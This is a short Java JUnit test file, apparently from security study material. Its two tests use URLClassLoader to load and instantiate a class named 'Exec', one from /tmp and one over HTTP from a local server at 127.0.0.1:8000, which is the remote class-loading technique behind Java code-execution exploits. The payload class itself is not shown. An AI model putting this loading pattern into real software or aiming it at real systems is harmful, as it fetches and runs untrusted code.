package org.example.sec.load;

import org.junit.Test;

import java.net.URL;
import java.net.URLClassLoader;

public class Exp {

    @Test
    public void exp1() throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///tmp/")});
        Class<?> clzz = urlClassLoader.loadClass("org.example.Exec");
        clzz.newInstance();
    }
    @Test
    public void exp2() throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8000")});
        Class<?> clzz = urlClassLoader.loadClass("org.example.Exec");
        clzz.newInstance();
    }
}
